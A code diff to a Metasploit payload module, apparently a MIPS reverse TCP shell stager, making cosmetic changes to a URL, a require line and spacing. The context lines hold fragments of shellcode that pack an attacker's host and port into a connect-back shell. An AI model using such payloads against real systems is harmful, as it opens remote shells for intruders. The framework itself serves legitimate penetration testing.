@@ -1,9 +1,8 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
@@ -75,7 +74,7 @@ module MetasploitModule
       port.pack("C2") + "\xce\x35" + # ori t6,t6,0x1f90
       "\xe4\xff\xae\xaf" + # sw t6,-28(sp)
       host[2..3].pack("C2") + "\x0e\x3c" + # lui t6,0x7f01
-      host[0..1].pack("C2") + "\xce\x35" +# ori t6,t6,0x101
+      host[0..1].pack("C2") + "\xce\x35" + # ori t6,t6,0x101
       "\xe6\xff\xae\xaf" + # sw t6,-26(sp)
       "\xe2\xff\xa5\x27" + # addiu a1,sp,-30
       "\xef\xff\x0c\x24" + # li t4,-17
@@ -117,5 +116,4 @@ module MetasploitModule
 
     return super + shellcode
   end
-
 end
